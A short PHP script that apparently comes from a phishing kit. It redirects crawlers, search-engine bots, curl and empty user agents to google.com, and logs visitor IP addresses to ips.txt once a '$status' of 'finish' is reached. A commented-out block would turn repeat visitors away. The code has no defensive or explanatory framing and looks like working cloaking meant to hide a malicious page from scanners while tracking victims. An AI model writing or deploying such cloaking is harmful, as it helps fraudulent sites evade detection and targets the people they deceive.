<?php
    $agent = $_SERVER['HTTP_USER_AGENT'];


    if(preg_match('/bot|yahoo|google|spider|crawler|curl|^$/i', $agent))
    {
        header("Location: http://google.com");
    }

    $vis_ip=$_SERVER["REMOTE_ADDR"];
    $data   = file_get_contents('ips.txt'); 
    $data   = explode("\r\n", $data);
    
    // if (in_array($vis_ip,$data))
    // { 
    //     header("Location: http://google.com");
    //     $file=fopen("ips.txt","a+"); 
    //             fwrite($file,$vis_ip."\r\n");
    //     fclose($file); 
    //     die();
    // }
    if($status=="finish")
    {
        $file=fopen("ips.txt","a+"); 
        fwrite($file,$vis_ip."\r\n");
        fclose($file); 
    }


?>